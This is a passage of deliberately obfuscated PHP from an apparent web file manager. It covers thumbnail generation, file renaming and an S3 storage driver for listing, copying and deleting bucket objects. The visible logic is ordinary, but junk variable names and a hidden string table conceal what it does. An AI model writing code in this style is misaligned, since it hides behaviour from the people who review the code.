($·˝Õ◊˝Ã[$¥≥≥˛¯Î[79]] <= 1024 * 50 || $µ∏™´ä∆ || !function_exists($¥≥≥˛¯Î[187]) || $·˝Õ◊˝Ã[$¥≥≥˛¯Î[169]] == $¥≥≥˛¯Î[188]) { return $this->fileOut($¨˛™å†Ë, !1, $·˝Õ◊˝Ã[$¥≥≥˛¯Î[32]]); } $˙áÏªÒÆ = kodIO::hashPath($·˝Õ◊˝Ã); $≥¸»£ô£ = "\143\x6f\166\145\162\x5f{$˙áÏªÒÆ}\x5f{$„˝ˆ≠Ò´}\56\160\x6e\x67"; $Ö∂ÚΩ´Á = IO_PATH_SYSTEM_TEMP . $¥≥≥˛¯Î[189]; $˙çÖÿ‡á = IO::infoFullSimple($Ö∂ÚΩ´Á); $†∆óÑÒ® = $˙çÖÿ‡á && is_array($˙çÖÿ‡á) ? $˙çÖÿ‡á[$¥≥≥˛¯Î[87]] : $¥≥≥˛¯Î[12]; if (!$†∆óÑÒ®) { $†∆óÑÒ® = IO::mkdir($Ö∂ÚΩ´Á); } if ($·˝Õ◊˝Ã[$¥≥≥˛¯Î[190]] == $¥≥≥˛¯Î[191] && isset($·˝Õ◊˝Ã[$¥≥≥˛¯Î[192]]) && $·˝Õ◊˝Ã[$¥≥≥˛¯Î[192]] == kodIO::sourceID($†∆óÑÒ®)) { $ïË§ÜâÕ = $·˝Õ◊˝Ã[$¥≥≥˛¯Î[193]]; if ($„˝ˆ≠Ò´ <= 500) { $—Ó‹à›◊ = preg_replace($¥≥≥˛¯Î[194], $¥≥≥˛¯Î[195], $·˝Õ◊˝Ã[$¥≥≥˛¯Î[32]]); $ïË§ÜâÕ = IO::fileNameExist($†∆óÑÒ®, $—Ó‹à›◊); } return IO::fileOut(KodIO::make($ïË§ÜâÕ), !1, $·˝Õ◊˝Ã[$¥≥≥˛¯Î[32]]); } $◊ù≈«»® = IO::fileNameExist($†∆óÑÒ®, $≥¸»£ô£); if ($◊ù≈«»®) { return IO::fileOut(KodIO::make($◊ù≈«»®), !1, $·˝Õ◊˝Ã[$¥≥≥˛¯Î[32]]); } if ($„˝ˆ≠Ò´ > 1000) { $this->makeImageCover($†∆óÑÒ®, $¨˛™å†Ë, $≥¸»£ô£, $„˝ˆ≠Ò´); $this->makeImageCover($†∆óÑÒ®, $¨˛™å†Ë, "\143\x6f\x76\x65\x72\x5f{$˙áÏªÒÆ}\137\x32\65\x30\x2e\160\156\147", 250); $◊ù≈«»® = IO::fileNameExist($†∆óÑÒ®, $≥¸»£ô£); if ($◊ù≈«»®) { return IO::fileOut(KodIO::make($◊ù≈«»®), !1, $·˝Õ◊˝Ã[$¥≥≥˛¯Î[32]]); } die; } if (!kodIO::allowCover($·˝Õ◊˝Ã)) { return $this->fileOut($¨˛™å†Ë, !1, $·˝Õ◊˝Ã[$¥≥≥˛¯Î[32]]); } $ﬁì’“¸î = Cache::get($≥¸»£ô£); if ($ﬁì’“¸î == $¥≥≥˛¯Î[196] || $ﬁì’“¸î == $¥≥≥˛¯Î[197]) { echo $ﬁì’“¸î; die; } Cache::set($≥¸»£ô£, $¥≥≥˛¯Î[197], 60); $à¨∑˙Ú˝ = array($†∆óÑÒ®, $·˝Õ◊˝Ã[$¥≥≥˛¯Î[87]], $≥¸»£ô£, $„˝ˆ≠Ò´); $Ã‰€∑Øù = $¥≥≥˛¯Î[198] . $·˝Õ◊˝Ã[$¥≥≥˛¯Î[79]] . $¥≥≥˛¯Î[199] . $≥¸»£ô£ . $¥≥≥˛¯Î[200] . $·˝Õ◊˝Ã[$¥≥≥˛¯Î[32]] . $¥≥≥˛¯Î[201] . $·˝Õ◊˝Ã[$¥≥≥˛¯Î[87]]; TaskQueue::add($¥≥≥˛¯Î[202], $à¨∑˙Ú˝, $Ã‰€∑Øù, $≥¸»£ô£); } public function makeImageCover($›«Ï©–º, $ö∏©‘∆ö, $Ô¨¸ Úı, $˘¬≈ú–©) { $Ω°”„Æ« =& $_SERVER[ß⁄ˆÇ†Œ]; if (IO::fileNameExist($›«Ï©–º, $Ô¨¸ Úı)) { return $Ω°”„Æ«[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $âõŒõî£ = DATA_THUMB . $Ô¨¸ Úı; del_file($âõŒõî£); $◊»Ú—ëâ = IO::copy($ö∏©‘∆ö, TEMP_FILES, !1, $Ô¨¸ Úı); if (!@file_exists($◊»Ú—ëâ)) { return $Ω°”„Æ«[204]; } ImageThumb::createThumb($◊»Ú—ëâ, $âõŒõî£, $˘¬≈ú–©, $˘¬≈ú–© * 10); if (@file_exists($âõŒõî£)) { Cache::remove($Ô¨¸ Úı); return IO::move($âõŒõî£, $›«Ï©–º); } Cache::set($Ô¨¸ Úı, $Ω°”„Æ«[196], 600); del_file($âõŒõî£); return $Ω°”„Æ«[205] . $◊»Ú—ëâ . $Ω°”„Æ«[74]; } public function fileOutImageServer($¢¡ª¸∂å, $°”îêá· = 250) { $this->fileOutImage($¢¡ª¸∂å, $°”îêá·); } public function fileNameAuto($ìÓÒ¡Û›, $˚†«Ÿ⁄í, $ûßŒì¿ = REPEAT_RENAME, $‡Ì≤ﬂï¿ = false) { $ÕÄŸË≠ª =& $_SERVER[ß⁄ˆÇ†Œ]; $—¨∑å∂Ó = $ìÓÒ¡Û› === $ÕÄŸË≠ª[12] ? $˚†«Ÿ⁄í : rtrim($ìÓÒ¡Û›, $ÕÄŸË≠ª[8]) . $ÕÄŸË≠ª[8] . $˚†«Ÿ⁄í; if ($ûßŒì¿ == REPEAT_REPLACE || !$this->exist($—¨∑å∂Ó) || $‡Ì≤ﬂï¿ && $ûßŒì¿ != REPEAT_RENAME_FOLDER) { return $˚†«Ÿ⁄í; } if ($ûßŒì¿ == REPEAT_SKIP) { return !1; } $≠æ◊”„¢ = $ÕÄŸË≠ª[10] . get_path_ext($˚†«Ÿ⁄í); $≠æ◊”„¢ = $≠æ◊”„¢ == $ÕÄŸË≠ª[10] || $‡Ì≤ﬂï¿ ? $ÕÄŸË≠ª[12] : $≠æ◊”„¢; $¡Ê©–Ú∂ = 1; $Çüô‡¡˛ = substr($˚†«Ÿ⁄í, 0, strlen($˚†«Ÿ⁄í) - strlen($≠æ◊”„¢)); $‰ı◊«›€ = $Çüô‡¡˛ . "\50{$¡Ê©–Ú∂}\51{$≠æ◊”„¢}"; while ($this->exist(rtrim($ìÓÒ¡Û›, $ÕÄŸË≠ª[8]) . $ÕÄŸË≠ª[8] . $‰ı◊«›€)) { $‰ı◊«›€ = $Çüô‡¡˛ . "\50{$¡Ê©–Ú∂}\51{$≠æ◊”„¢}"; $¡Ê©–Ú∂++; } return $‰ı◊«›€; } private function fileNameAutoList($”˘–ä∑Â, $£Â¢ƒ¬», $†∑¶ùì¡ = false) { $ùπËìåΩ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÄÓÿ≠íú = $this->listPath($”˘–ä∑Â, !0); $ÄÓÿ≠íú = array_merge($ÄÓÿ≠íú[$ùπËìåΩ[85]], $ÄÓÿ≠íú[$ùπËìåΩ[86]]); $°≥˝çî« = array_to_keyvalue($ÄÓÿ≠íú, $ùπËìåΩ[12], $ùπËìåΩ[32]); $£Ú´∆Ê’ = $ùπËìåΩ[10] . get_path_ext($£Â¢ƒ¬»); $£Ú´∆Ê’ = $£Ú´∆Ê’ == $ùπËìåΩ[10] || $†∑¶ùì¡ ? $ùπËìåΩ[12] : $£Ú´∆Ê’; $—æ≠∫ßı = substr($£Â¢ƒ¬», 0, strlen($£Â¢ƒ¬») - strlen($£Ú´∆Ê’)); $—€Ôîûı = $—æ≠∫ßı . "\50\60\x29{$£Ú´∆Ê’}"; for ($ÍË∫«∆Î = 1; $ÍË∫«∆Î <= count($°≥˝çî«) + 1; $ÍË∫«∆Î++) { $—€Ôîûı = $—æ≠∫ßı . "\x28{$ÍË∫«∆Î}\x29{$£Ú´∆Ê’}"; if (!in_array_not_case($—€Ôîûı, $°≥˝çî«)) { return $—€Ôîûı; } } return $—€Ôîûı; } public function listAllFiles($Ãô±îÚ„, $´˙ôÒÖÄ) { $»›ä∑ï© =& $_SERVER[ß⁄ˆÇ†Œ]; if (empty($´˙ôÒÖÄ)) { return array(); } $é€¥¥⁄Ω = array_keys($´˙ôÒÖÄ); $ñÛ±‰¡â = array(); $Ãô±îÚ„ = trim($Ãô±îÚ„, $»›ä∑ï©[8]); foreach ($´˙ôÒÖÄ as $˘·ıúîÙ => $Ù√”˛⁄›) { $≠ﬁπãÛ‘ = ltrim(substr(trim($˘·ıúîÙ, $»›ä∑ï©[8]), strlen($Ãô±îÚ„)), $»›ä∑ï©[8]); if (substr($˘·ıúîÙ, -1) == $»›ä∑ï©[8]) { $≠ﬁπãÛ‘ = rtrim($≠ﬁπãÛ‘, $»›ä∑ï©[8]) . $»›ä∑ï©[8]; } $ñÛ±‰¡â = array_merge($ñÛ±‰¡â, $this->slicePath($≠ﬁπãÛ‘)); } $‡à€¶ÈÒ = array(); foreach (array_unique($ñÛ±‰¡â) as $ ÑÁ≈Òß) { $˙ú∂æº‰ = array($»›ä∑ï©[87] => $this->getPathOuter($»›ä∑ï©[8] . $Ãô±îÚ„ . $»›ä∑ï©[8] . $ ÑÁ≈Òß), $»›ä∑ï©[78] => 1, $»›ä∑ï©[79] => 0); if (substr($ ÑÁ≈Òß, -1) != $»›ä∑ï©[8]) { $˙ú∂æº‰[$»›ä∑ï©[78]] = 0; $ÁÅÌ∑• = $this->getPath($Ãô±îÚ„ . $»›ä∑ï©[8] . $ ÑÁ≈Òß); if (isset($´˙ôÒÖÄ[$ÁÅÌ∑•])) { $ˆ¥Â°œÎ = $´˙ôÒÖÄ[$ÁÅÌ∑•]; if (isset($ˆ¥Â°œÎ[$»›ä∑ï©[79]])) { $˙ú∂æº‰[$»›ä∑ï©[79]] = intval($ˆ¥Â°œÎ[$»›ä∑ï©[79]]); } if (isset($ˆ¥Â°œÎ[$»›ä∑ï©[206]])) { $˙ú∂æº‰[$»›ä∑ï©[88]] = intval($ˆ¥Â°œÎ[$»›ä∑ï©[206]]); } } } $‡à€¶ÈÒ[] = $˙ú∂æº‰; } return $‡à€¶ÈÒ; } public function slicePath($èñ¡îŒ•) { $‚¡ÆÈôƒ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÌçﬂÿÈä = explode($‚¡ÆÈôƒ[8], trim($èñ¡îŒ•, $‚¡ÆÈôƒ[8])); $˝˝«˚ÍË = 0; do { ++$˝˝«˚ÍË; $íÌÏﬁÖô[] = implode($‚¡ÆÈôƒ[8], array_slice($ÌçﬂÿÈä, 0, $˝˝«˚ÍË)) . $‚¡ÆÈôƒ[8]; } while ($˝˝«˚ÍË < count($ÌçﬂÿÈä)); $íÌÏﬁÖô[count($ÌçﬂÿÈä) - 1] = $èñ¡îŒ•; return $íÌÏﬁÖô; } public function getHost() { $ ≈∆ˆ÷˙ =& $_SERVER[ß⁄ˆÇ†Œ]; $ú÷ÀáÒ¬ = parse_url(trim($this->domain, $ ≈∆ˆ÷˙[8])); $ô∫—‚ÄÑ = isset($ú÷ÀáÒ¬[$ ≈∆ˆ÷˙[207]]) ? $ú÷ÀáÒ¬[$ ≈∆ˆ÷˙[207]] : http_type(); $Ö´‘˚◊¶ = isset($ú÷ÀáÒ¬[$ ≈∆ˆ÷˙[208]]) ? $ú÷ÀáÒ¬[$ ≈∆ˆ÷˙[208]] : $ú÷ÀáÒ¬[$ ≈∆ˆ÷˙[87]]; if (isset($ú÷ÀáÒ¬[$ ≈∆ˆ÷˙[209]])) { $Ö´‘˚◊¶ .= $ ≈∆ˆ÷˙[4] . $ú÷ÀáÒ¬[$ ≈∆ˆ÷˙[209]]; } return $ô∫—‚ÄÑ . $ ≈∆ˆ÷˙[210] . $Ö´‘˚◊¶; } public function pathEncode($™∫¢‘êÓ) { $≤·Ö˝©Ñ =& $_SERVER[ß⁄ˆÇ†Œ]; return str_replace($≤·Ö˝©Ñ[211], $≤·Ö˝©Ñ[8], rawurlencode($™∫¢‘êÓ)); } public function writeLog($¸ÀûûÛ‰ = '', $Â‰œ§¯Ô = false) { $·—¬≤≠ =& $_SERVER[ß⁄ˆÇ†Œ]; $ªô‹ﬂÛÓ = in_array(ACTION, array($·—¬≤≠[212], $·—¬≤≠[213])); if (!$ªô‹ﬂÛÓ && !GLOBAL_DEBUG) { return; } $òåÅ¡Ω™ = $¸ÀûûÛ‰; static $ÈÜªÎ“ƒ = null; if (!$ÈÜªÎ“ƒ) { $ÈÜªÎ“ƒ = strtoupper($this->getType()); } $¸ÀûûÛ‰ = $ÈÜªÎ“ƒ . $·—¬≤≠[214] . $¸ÀûûÛ‰; if ($Â‰œ§¯Ô) { $øﬁúı†È = error_get_last(); if ($øﬁúı†È) { $¸ÀûûÛ‰ = array($¸ÀûûÛ‰, $øﬁúı†È); } } write_log($¸ÀûûÛ‰, $·—¬≤≠[215]); if ($ªô‹ﬂÛÓ) { throw new Exception($òåÅ¡Ω™); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ç€ÌΩ∂„) { set_timeout(); require_once SDK_DIR . $_SERVER[ß⁄ˆÇ†Œ][216]; parent::__construct(); $this->_init($ç€ÌΩ∂„); } public function _init($¨éü˚‘Í) { $…¶ıé‚¸ =& $_SERVER[ß⁄ˆÇ†Œ]; $this->config = $¨éü˚‘Í; foreach ($¨éü˚‘Í as $‰≈—»å¸ => $†Ç”ë©Ç) { if (isset($this->{$‰≈—»å¸})) { $this->{$‰≈—»å¸} = $†Ç”ë©Ç; } } $this->endpoint = $¨éü˚‘Í[$…¶ıé‚¸[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($…¶ıé‚¸[212], $…¶ıé‚¸[213]))) { $this->client->setExceptions(); } } public function setSignVersion($‰·æ∂˘È = "\x76\64") { $this->signVer = $‰·æ∂˘È; $this->client->setSignatureVersion($‰·æ∂˘È); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $´˚äïÅñ) { return null; } } public function isBucketCors() { $Õ©”êüû =& $_SERVER[ß⁄ˆÇ†Œ]; $õ⁄™òª˙ = $this->getBucketCors(); if (!$õ⁄™òª˙ || !is_array($õ⁄™òª˙)) { return !1; } if (!is_array($õ⁄™òª˙[$Õ©”êüû[218]])) { $õ⁄™òª˙[$Õ©”êüû[218]] = explode($Õ©”êüû[50], $õ⁄™òª˙[$Õ©”êüû[218]]); } if ($õ⁄™òª˙[$Õ©”êüû[219]] != $Õ©”êüû[220] || !in_array($Õ©”êüû[220], $õ⁄™òª˙[$Õ©”êüû[218]])) { return !1; } $¸Ω’ç„˛ = array_map($Õ©”êüû[221], $õ⁄™òª˙[$Õ©”êüû[222]]); if (!is_array($¸Ω’ç„˛)) { $¸Ω’ç„˛ = array(); } $†„£≤Ìﬁ = array($Õ©”êüû[223], $Õ©”êüû[224], $Õ©”êüû[225], $Õ©”êüû[226], $Õ©”êüû[227]); $ÏãïÉÕÍ = array_diff($†„£≤Ìﬁ, $¸Ω’ç„˛); return empty($ÏãïÉÕÍ); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($∞ô™°≤Ò, $∂·πÈµ– = '', $Á–√ø·  = REPEAT_RENAME) { $‰ª∑êﬂî = $this->setContent($∞ô™°≤Ò, $∂·πÈµ–); if ($‰ª∑êﬂî !== !1) { return $this->getPathOuter($∞ô™°≤Ò); } return !1; } public function mkdir($ﬂ®Ÿ†õ…, $Ù ∂”û¬ = REPEAT_SKIP) { $À¡äˆÆ =& $_SERVER[ß⁄ˆÇ†Œ]; if (empty($ﬂ®Ÿ†õ…) && $ﬂ®Ÿ†õ… !== $À¡äˆÆ[228]) { return !1; } if ($Ù ∂”û¬ && $this->_isFolder($ﬂ®Ÿ†õ…)) { return $this->getPathOuter($ﬂ®Ÿ†õ…); } $¸’ı¯ÿ± = $this->setContent($ﬂ®Ÿ†õ…, $À¡äˆÆ[12], !0); if ($¸’ı¯ÿ± !== !1) { return $this->getPathOuter($ﬂ®Ÿ†õ…); } return !1; } public function copyFile($ï¯∏ ™∏, $êÿò∫ü◊, $ÌÙÇô–Ã = array()) { $˚∆◊˛«ë =& $_SERVER[ß⁄ˆÇ†Œ]; $¨ªêú‰‘ = $this->objectMeta($ï¯∏ ™∏); if (!$¨ªêú‰‘) { return !1; } if ($¨ªêú‰‘[$˚∆◊˛«ë[79]] <= 1024 * 1024 * 200) { $Ä∞èÚô∆ = $this->client->copyObject($this->bucket, $ï¯∏ ™∏, $this->bucket, $êÿò∫ü◊, $˚∆◊˛«ë[229], $ÌÙÇô–Ã); } else { $Ä∞èÚô∆ = $this->client->multiCopyObject($this->bucket, $ï¯∏ ™∏, $this->bucket, $êÿò∫ü◊, $ÌÙÇô–Ã); } $Ä∞èÚô∆ = $Ä∞èÚô∆ ? $this->getPathOuter($êÿò∫ü◊) : !1; return $Ä∞èÚô∆; } public function moveFile($π’‚‹ñé, $ú¡Á¥á∏) { if ($this->copyFile($π’‚‹ñé, $ú¡Á¥á∏)) { $this->delFile($π’‚‹ñé); return $this->getPathOuter($ú¡Á¥á∏); } return !1; } public function delFile($Â∫é≤Õ≠) { return $this->client->deleteObject($this->bucket, $Â∫é≤Õ≠); } public function delFolder($∆éøç∫) { $∏ï‹∆Úß =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->exist($∆éøç∫)) { return !0; } $this->listItemCache = !1; $°€†éÁ— = $this->fileList($∆éøç∫); $this->listItemCache = !0; $ù≥óÕ∞– = trim($∆éøç∫, $∏ï‹∆Úß[8]) . $∏ï‹∆Úß[8]; if (!empty($∆éøç∫) && $∆éøç∫ !== $∏ï‹∆Úß[228] && !in_array($ù≥óÕ∞–, $°€†éÁ—[$∏ï‹∆Úß[85]])) { $°€†éÁ—[$∏ï‹∆Úß[85]][] = $ù≥óÕ∞–; } $¥êŸ•¢è = $this->delByBatch($°€†éÁ—[$∏ï‹∆Úß[86]]); if (!$¥êŸ•¢è) { return !1; } $¥êŸ•¢è = $this->delByBatch($°€†éÁ—[$∏ï‹∆Úß[85]]); if (!$¥êŸ•¢è) { return !1; } return $this->delFile($ù≥óÕ∞–); } private function delByBatch($∆˜‘â◊·) { foreach (array_chunk($∆˜‘â◊·, 1000) as $÷òÙ´åé) { $ûƒ≤ùô∏ = $this->client->deleteObjects($this->bucket, $÷òÙ´åé); if (!$ûƒ≤ùô∏) { return !1; } } return !0; } public function rename($ìß–†å—, $ùîÓàÁõ) { return $this->renameObject($ìß–†å—, $ùîÓàÁõ); } public function listPath($∆∑©Ó©€, $ﬂﬂÔ≠»≈ = false) { $≤¨·˛ÙÁ =& $_SERVER[ß⁄ˆÇ†Œ]; $Â’çíçë = $this->fileList($∆∑©Ó©€, $≤¨·˛ÙÁ[8], !0); foreach ($Â’çíçë[$≤¨·˛ÙÁ[85]] as $¨ØÄãπ≠ => $˚üªàû¶) { $Â’çíçë[$≤¨·˛ÙÁ[85]][$¨ØÄãπ≠] = $this->folderInfo($˚üªàû¶, $ﬂﬂÔ≠»≈, $˚üªàû¶); } foreach ($Â’çíçë[$≤¨·˛ÙÁ[86]] as $¨ØÄãπ≠ => $˚üªàû¶) { $Â’çíçë[$≤¨·˛ÙÁ[86]][$¨ØÄãπ≠] = $this->fileInfo($˚üªàû¶[$≤¨·˛ÙÁ[32]], $ﬂﬂÔ≠»≈, $˚üªàû¶); } return $Â’çíçë; } protected function infoChildren($ËÔ¸“ﬁæ, &$¥§—ÚÌ») { $ï∂Û£◊¢ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÔÖÛ·“É = $this->fileList($ËÔ¸“ﬁæ, $ï∂Û£◊¢[12], !0); $¥§—ÚÌ»[$ï∂Û£◊¢[81]] += count($ÔÖÛ·“É[$ï∂Û£◊¢[85]]); $¥§—ÚÌ»[$ï∂Û£◊¢[80]] += count($ÔÖÛ·“É[$ï∂Û£◊¢[86]]); foreach ($ÔÖÛ·“É[$ï∂Û£◊¢[86]] as $µ≈Üëø„) { if (!$µ≈Üëø„ || !$µ≈Üëø„[$ï∂Û£◊¢[79]]) { continue; } $¥§—ÚÌ»[$ï∂Û£◊¢[79]] += $µ≈Üëø„[$ï∂Û£◊¢[79]]; } } private function fileInfo($∂±∂ŒΩñ, $¯∞Ì∫√¥ = false, $ Á¬¿™ı = array()) { $‘⁄Íﬁ˚ =& $_SERVER[ß⁄ˆÇ†Œ]; $’í¸‚Ÿ÷ = array($‘⁄Íﬁ˚[32] => $this->pathThis($∂±∂ŒΩñ), $‘⁄Íﬁ˚[87] => $this->getPathOuter($∂±∂ŒΩñ), $‘⁄Íﬁ˚[33] => $‘⁄Íﬁ˚[230], $‘⁄Íﬁ˚[169] => $this->ext($∂±∂ŒΩñ), $‘⁄Íﬁ˚[79] => isset($ Á¬¿™ı[$‘⁄Íﬁ˚[79]]) ? $ Á¬¿™ı[$‘⁄Íﬁ˚[79]] : 0); if ($¯∞Ì∫√¥) { return $’í¸‚Ÿ÷; } $’í¸‚Ÿ÷[$‘⁄Íﬁ˚[231]] = $’í¸‚Ÿ÷[$‘⁄Íﬁ˚[88]] = 0; $’í¸‚Ÿ÷[$‘⁄Íﬁ˚[232]] = $’í¸‚Ÿ÷[$‘⁄Íﬁ˚[233]] = !0; if (empty($ Á¬¿™ı)) { $ Á¬¿™ı = $this->objectMeta($∂±∂ŒΩñ); if (!$ Á¬¿™ı) { return $’í¸‚Ÿ÷; } } if (isset($ Á¬¿™ı[$‘⁄Íﬁ˚[234]]) && $ Á¬¿™ı[$‘⁄Íﬁ˚[234]]) { $’í¸‚Ÿ÷[$‘⁄Íﬁ˚[235]] = $ Á¬¿™ı[$‘⁄Íﬁ˚[234]]; } if (isset($ Á¬¿™ı[$‘⁄Íﬁ˚[206]])) { $’í¸‚Ÿ÷[$‘⁄Íﬁ˚[88]] = $ Á¬¿™ı[$‘⁄Íﬁ˚[206]]; } if (isset($ Á¬¿™ı[$‘⁄Íﬁ˚[79]])) { $’í¸‚Ÿ÷[$‘⁄Íﬁ˚[79]] = $ Á¬¿™ı[$‘⁄Íﬁ˚[79]]; } return $’í¸‚Ÿ÷; } private function folderInfo($Í©Ó£ƒ∑, $–÷≠ƒï = false, $ΩóçÂ‰‘ = array()) { $¸‰‹Ù“¸ =& $_SERVER[ß⁄ˆÇ†Œ]; $€çœÕâÎ = array($¸‰‹Ù“¸[32] => $this->pathThis($Í©Ó£ƒ∑), $¸‰‹Ù“¸[87] => $this->getPathOuter($¸‰‹Ù“¸[8] . $Í©Ó£ƒ∑), $¸‰‹Ù“¸[33] => $¸‰‹Ù“¸[78]); if ($–÷≠ƒï) { return $€çœÕâÎ; } $€çœÕâÎ[$¸‰‹Ù“¸[231]] = $€çœÕâÎ[$¸‰‹Ù“¸[88]] = 0; $€çœÕâÎ[$¸‰‹Ù“¸[232]] = $€çœÕâÎ[$¸‰‹Ù“¸[233]] = !0; if ($Í©Ó£ƒ∑ == $¸‰‹Ù“¸[12]) { return $€çœÕâÎ; } if (empty($ΩóçÂ‰‘)) { $ΩóçÂ‰‘ = $this->objectMeta(trim($Í©Ó£ƒ∑, $¸‰‹Ù“¸[8]) . $¸‰‹Ù“¸[8]); } if (isset($ΩóçÂ‰‘[$¸‰‹Ù“¸[206]])) { $€çœÕâÎ[$¸‰‹Ù“¸[231]] = $ΩóçÂ‰‘[$¸‰‹Ù“¸[206]]; } return $€çœÕâÎ; } private function fileList($¿È≈√î±, $âó’ıÇÏ = '', $™¨ˆ∏¬ô = 0) { $Çâı”∏… =& $_SERVER[ß⁄ˆÇ†Œ]; $å†÷‚ﬂÛ = rtrim($¿È≈√î±, $Çâı”∏…[8]) . $Çâı”∏…[8]; $Ñ©≈Æ¯Ø = $this->listObjs($å†÷‚ﬂÛ, null, null, $âó’ıÇÏ); if (!$Ñ©≈Æ¯Ø) { return array($Çâı”∏…[85] => array(), $Çâı”∏…[86] => array()); } $¸ÆÇﬁ¶è = $±ç¨ûî = array(); foreach ($Ñ©≈Æ¯Ø[$Çâı”∏…[236]] as $¬áª€ñÄ) { $°ö‹ã¬¿ = $¬áª€ñÄ[$Çâı”∏…[32]]; if ($°ö‹ã¬¿ == $å†÷‚ﬂÛ) { continue; } $∑⁄≥ñú˛ = isset($¬áª€ñÄ[$Çâı”∏…[79]]) ? $¬áª€ñÄ[$Çâı”∏…[79]] : 0; $Èªõ§¥µ = $∑⁄≥ñú˛ == 0 && substr($°ö‹ã¬¿, strlen($°ö‹ã¬¿) - 1, 1) == $Çâı”∏…[8] ? !0 : !1; $this->cacheMethodInfoSet($°ö‹ã¬¿, $Èªõ§¥µ, $¬áª€ñÄ); if ($Èªõ§¥µ) { $¸ÆÇﬁ¶è[] = $°ö‹ã¬¿; continue; } $±ç¨ûî[] = $™¨ˆ∏¬ô ? $¬áª€ñÄ : $°ö‹ã¬¿; } foreach ($Ñ©≈Æ¯Ø[$Çâı”∏…[237]] as $¬áª€ñÄ) { $¸ÆÇﬁ¶è[] = $¬áª€ñÄ[$Çâı”∏…[32]]; $this->cacheMethodInfoSet($¬áª€ñÄ[$Çâı”∏…[32]], !0); } $this->cacheMethodInfoSet($¿È≈√î±, !0); return array($Çâı”∏…[85] => $¸ÆÇﬁ¶è, $Çâı”∏…[86] => $±ç¨ûî); } private function listObjs($–”—◊’˚, $˘öÑÍé˚ = null, $ì‚æ≠áú = null, $ „áÿ±“ = null) { $≤˙·ä≈à =& $_SERVER[ß⁄ˆÇ†Œ]; $–”—◊’˚ = trim($–”—◊’˚, $≤˙·ä≈à[8]); $·∆⁄˝—÷ = empty($–”—◊’˚) && $–”—◊’˚ !== $≤˙·ä≈à[228] ? $≤˙·ä≈à[12] : $–”—◊’˚ . $≤˙·ä≈à[8]; return $this->client->getBucket($this->bucket, $·∆⁄˝—÷, $˘öÑÍé˚, $ì‚æ≠áú, $ „áÿ±“, !0); } public function has($ûÉÊë›Ú, $˙è≤–ΩÄ = false, $Ñù∞®·´ = true) { $ò⁄·≤ÚÖ =& $_SERVER[ß⁄ˆÇ†Œ]; $ûÉÊë›Ú = trim($ûÉÊë›Ú, $ò⁄·≤ÚÖ[8]); $≥é∑®Î√ = empty($ûÉÊë›Ú) && $ûÉÊë›Ú !== $ò⁄·≤ÚÖ[228] ? $ò⁄·≤ÚÖ[12] : $ûÉÊë›Ú . $ò⁄·≤ÚÖ[8]; $§’èèÿÑ = null; $¯≠Ø—°‘ = 500; $Èïàπ·  = $ò⁄·≤ÚÖ[8]; $˜Æ¶ºãË = $‚ÖÓ…§· = array(); while (!0) { $ˆÅ»ı˝è = $this->listObjs($ûÉÊë›Ú, $§’èèÿÑ, $¯≠Ø—°‘, $Èïàπ· ); if (!$ˆÅ»ı˝è) { break; } $§’èèÿÑ = $ˆÅ»ı˝è[$ò⁄·≤ÚÖ[238]]; $§™ÖÔËû = $ˆÅ»ı˝è[$ò⁄·≤ÚÖ[236]]; $á•ÈëÓÃ = $ˆÅ»ı˝è[$ò⁄·≤ÚÖ[237]]; if (empty($§™ÖÔËû) && empty($á•ÈëÓÃ)) { break; } if (count($§™ÖÔËû) == 1 && $§™ÖÔËû[0][$ò⁄·≤ÚÖ[32]] == $≥é∑®Î√) { break; } if ($˙è≤–ΩÄ) { if (count($§™ÖÔËû)) { $§™ÖÔËû = array_column($§™ÖÔËû, $ò⁄·≤ÚÖ[32]); $˜Æ¶ºãË = array_merge($˜Æ¶ºãË, $§™ÖÔËû); } if (count($á•ÈëÓÃ)) { $á•ÈëÓÃ = array_column($á•ÈëÓÃ, $ò⁄·≤ÚÖ[32]); $‚ÖÓ…§· = array_merge($‚ÖÓ…§·, $á•ÈëÓÃ); } if ($§’èèÿÑ === null) { break; } continue; } if ($Ñù∞®·´) { if (!empty($§™ÖÔËû)) { if (count($§™ÖÔËû) > 1 || isset($§™ÖÔËû[0][$ò⁄·≤ÚÖ[32]]) && $§™ÖÔËû[0][$ò⁄·≤ÚÖ[32]] != $≥é∑®Î√) { return !0; } } } else { if (!empty($á•ÈëÓÃ)) { return !0; } } if ($§’èèÿÑ === null) { break; } } if ($˙è≤–ΩÄ) { $˜Æ¶ºãË = array_diff($˜Æ¶ºãË, array($≥é∑®Î√)); $˜Æ¶ºãË = count(array_unique($˜Æ¶ºãË)); $‚ÖÓ…§· = count(array_unique($‚ÖÓ…§·)); return array($ò⁄·≤ÚÖ[239] => $˜Æ¶ºãË, $ò⁄·≤ÚÖ[240] => $‚ÖÓ…§·); } return !1; } public function listAll($Äô∆æ˙Å) { $ÎÁıÛø° =& $_SERVER[ß⁄ˆÇ†Œ]; $˙®ÀíÌÖ = $this->fileList($Äô∆æ˙Å, $ÎÁıÛø°[12], !0); $”÷ÈË›ï = array_to_keyvalue($˙®ÀíÌÖ[$ÎÁıÛø°[86]], $ÎÁıÛø°[32]); foreach ($˙®ÀíÌÖ[$ÎÁıÛø°[85]] as $õ◊Ôû¿Ê) { if (is_string($õ◊Ôû¿Ê)) { $”÷ÈË›ï[$õ◊Ôû¿Ê] = array($ÎÁıÛø°[79] => 0); } } return $this->listAllFiles($Äô∆æ˙Å, $”÷ÈË›ï); } public function canRead($íè—ÒÉ˚) { $œùƒ…õÌ =& $_SERVER[ß⁄ˆÇ†Œ]; $®˘Ç˜»⁄ = 